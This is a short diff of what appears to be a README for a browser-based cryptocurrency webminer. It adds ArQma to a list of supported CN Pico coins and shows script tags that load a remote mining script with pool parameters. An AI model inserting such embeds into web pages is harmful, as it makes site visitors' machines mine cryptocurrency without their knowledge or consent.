@@ -36,7 +36,7 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Graft | Sumoko
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn-lite/1?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
-#### Examples: CN Pico Coins (Turtlecoin, NXstream) need ?algo=cn-pico/trtl
+#### Examples: CN Pico Coins (Turtlecoin, NXstream, ArQma) need ?algo=cn-pico/trtl
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn-pico/trtl?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
